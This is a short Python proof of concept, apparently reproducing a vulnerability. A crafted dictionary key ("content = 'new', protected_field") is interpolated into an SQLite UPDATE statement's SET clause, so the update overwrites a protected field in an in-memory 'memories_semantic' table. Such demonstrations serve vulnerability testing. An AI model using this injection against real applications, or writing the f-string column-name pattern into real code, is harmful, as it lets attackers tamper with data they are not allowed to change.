import sqlite3

conn = sqlite3.connect(":memory:")
conn.execute("""
    CREATE TABLE memories_semantic (
        id TEXT PRIMARY KEY,
        content TEXT NOT NULL,
        tenant TEXT NOT NULL,
        project_id TEXT NOT NULL,
        protected_field TEXT
    );
""")
conn.execute("INSERT INTO memories_semantic (id, content, tenant, project_id, protected_field) VALUES ('1', 'old', 't1', 'p1', 'secret')")

# The exploit is passing an object containing arbitrary sql as the key
updates = {
    "content = 'new', protected_field": "hacked"
}

set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
params = list(updates.values()) + ['1', 't1', 'p1']

try:
    print(f"Executing: UPDATE memories_semantic SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?")
    cur = conn.execute(
        f"UPDATE memories_semantic SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?",
        params,
    )
    print(f"Rowcount: {cur.rowcount}")

    row = conn.execute("SELECT * FROM memories_semantic WHERE id = '1'").fetchone()
    print(f"Result: {row}")
except Exception as e:
    print(f"Exception: {e}")
